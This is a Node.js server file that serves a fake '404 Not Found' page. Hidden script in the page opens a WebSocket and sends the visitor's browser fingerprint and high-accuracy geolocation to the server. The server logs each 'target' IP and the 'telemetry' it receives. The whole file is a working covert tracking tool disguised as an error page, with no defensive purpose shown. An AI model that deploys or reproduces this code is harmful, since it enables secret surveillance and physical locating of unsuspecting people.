// language: JavaScript, file: server.js, target: Node.js / All Browsers
const { WebSocketServer } = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding-top: 100px; color: #333; background: #f4f4f4; }
        h1 { font-size: 48px; margin-bottom: 10px; }
        p { color: #666; font-size: 16px; }
    </style>
</head>
<body>
    <h1>404</h1>
    <p>The requested URL was not found on this server.</p>
<script>
const ws = new WebSocket('wss://' + location.host);
ws.onopen = () => {
    const payload = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: window.screen.width + 'x' + window.screen.height,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown'
    };
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                payload.latitude = pos.coords.latitude;
                payload.longitude = pos.coords.longitude;
                payload.accuracy = pos.coords.accuracy;
                ws.send(JSON.stringify(payload));
            },
            (err) => {
                payload.geoError = err.message;
                ws.send(JSON.stringify(payload));
            },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    } else {
        payload.geoError = "Not supported";
        ws.send(JSON.stringify(payload));
    }
};
</script>
</body>
</html>`);
});

const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log('[+] Target hit 404 page from IP: ' + clientIp);

    ws.on('message', (data) => {
        try {
            const parsedData = JSON.parse(data);
            console.log('[*] Target Telemetry Acquired:');
            console.log(parsedData);
        } catch (error) {
            console.log('[*] Raw Data: ' + data.toString());
        }
    });

    ws.on('close', () => {
        console.log('[-] Target session closed');
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log('[!] Camouflage server active on port ' + PORT);
});
